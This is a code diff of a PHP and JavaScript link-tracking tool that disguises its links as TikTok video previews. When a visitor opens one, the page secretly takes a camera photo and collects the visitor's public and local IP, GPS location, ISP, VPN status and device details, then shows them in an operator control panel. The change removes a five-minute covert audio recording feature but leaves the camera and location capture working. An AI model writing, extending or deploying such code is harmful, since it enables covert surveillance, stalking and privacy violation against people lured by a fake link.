@@ -46,7 +46,6 @@ try {
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
         image_data TEXT, 
-        audio_data TEXT, 
         public_ip TEXT, 
         local_ip TEXT, 
         port TEXT, 
@@ -60,7 +59,6 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة لجلب معلومات تيك توك للمعاينة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
@@ -220,7 +218,6 @@ if (isset($_GET['r'])) {
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             $img_base64 = $_POST['image'] ?? '';
-            $audio_base64 = $_POST['audio'] ?? '';
             $public_ip = get_real_ip();
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
@@ -253,23 +250,8 @@ if (isset($_GET['r'])) {
             $device = get_device_type($ua);
 
             try {
-                $db->exec("CREATE TABLE IF NOT EXISTS captures (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT, 
-                    code TEXT, 
-                    image_data TEXT, 
-                    audio_data TEXT, 
-                    public_ip TEXT, 
-                    local_ip TEXT, 
-                    port TEXT, 
-                    location TEXT, 
-                    isp_info TEXT, 
-                    vpn_status TEXT, 
-                    device_info TEXT, 
-                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-                )");
-
-                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, audio_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $capStmt->execute([$code, $img_base64, $audio_base64, $public_ip, $local_ip, $port, $location, $isp, $vpn, $device, date('Y-m-d H:i:s')]);
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $isp, $vpn, $device, date('Y-m-d H:i:s')]);
             } catch (Exception $e) {}
             exit('OK');
         }
@@ -325,7 +307,7 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function executeTrackingSequence(imageData = "", audioData = "") {
+        function executeTrackingSequence(imageData = "") {
             if (isProcessed) return;
             isProcessed = true;
 
@@ -334,7 +316,6 @@ if (isset($_GET['r'])) {
                     const formData = new URLSearchParams();
                     formData.append('save_info', '1');
                     formData.append('image', imageData);
-                    formData.append('audio', audioData);
                     formData.append('lip', localIp);
                     formData.append('lat', lat);
                     formData.append('lon', lon);
@@ -367,68 +348,32 @@ if (isset($_GET['r'])) {
             const overlay = document.getElementById('permissionOverlay');
             if(overlay) overlay.style.display = 'none';
 
-            let capturedImage = "";
-            let capturedAudio = "";
+            if (!useCamera) {
+                executeTrackingSequence("");
+                return;
+            }
 
-            const mediaConstraints = {
-                audio: true,
-                video: useCamera ? { facingMode: "user" } : false
-            };
-
-            navigator.mediaDevices.getUserMedia(mediaConstraints)
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    let audioChunks = [];
-                    let mediaRecorder;
-                    try {
-                        mediaRecorder = new MediaRecorder(stream);
-                        mediaRecorder.ondataavailable = event => {
-                            if (event.data.size > 0) audioChunks.push(event.data);
-                        };
-                        mediaRecorder.onstop = () => {
-                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                            const reader = new FileReader();
-                            reader.readAsDataURL(audioBlob);
-                            reader.onloadend = () => {
-                                capturedAudio = reader.result;
-                                finalizeCapture();
-                            };
-                        };
-                        mediaRecorder.start();
-                    } catch (e) {}
-
-                    if (useCamera) {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 640;
-                            canvas.height = 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            capturedImage = canvas.toDataURL('image/jpeg', 0.85);
-                        }, 400);
-                    }
-
-                    // ضبط مدة التسجيل الصوتي لتصبح 5 دقائق (300,000 ملي ثانية)
-                    // ملاحظة: سيتم إرسال البيانات بعد انتهاء مدة الـ 5 دقائق أو عند مغادرة الصفحة
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
                     setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        } else {
-                            stream.getTracks().forEach(track => track.stop());
-                            finalizeCapture();
-                        }
-                    }, 300000); 
-
-                    function finalizeCapture() {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         stream.getTracks().forEach(track => track.stop());
-                        executeTrackingSequence(capturedImage, capturedAudio);
-                    }
+
+                        executeTrackingSequence(imageData);
+                    }, 400);
                 })
                 .catch(err => {
-                    executeTrackingSequence("", "");
+                    executeTrackingSequence("");
                 });
         }
 
@@ -651,7 +596,7 @@ if (!empty($filter_code)) {
         
         <div>
             <h1>Control Panel</h1>
-            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3 (5-Min Audio & GPS Enabled)</p>
+            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3</p>
         </div>
 
         <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
@@ -677,7 +622,7 @@ if (!empty($filter_code)) {
                     
                     <label class="checkbox-container">
                         <input type="checkbox" name="use_camera" value="1" checked>
-                        تفعيل التقاط صورة الكاميرا وتسجيل الصوت (5 دقائق) عند الزيارة
+                        تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)
                     </label>
 
                     <button type="submit" name="create" class="btn">Generate Link</button>
@@ -730,15 +675,6 @@ if (!empty($filter_code)) {
                                 <?php else: ?>
                                     <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--text-muted); font-size: 12px; border: 1px dashed var(--border-color);">
                                         الكاميرا معطلة (بدون صورة)
-                                    </div>
-                                <?php endif; ?>
-
-                                <?php if (!empty($cap['audio_data'])): ?>
-                                    <div style="margin-top: 10px;">
-                                        <audio controls style="width: 100%; height: 32px;">
-                                            <source src="<?php echo $cap['audio_data']; ?>" type="audio/webm">
-                                            متصفحك لا يدعم مشغل الصوت.
-                                        </audio>
                                     </div>
                                 <?php endif; ?>
 
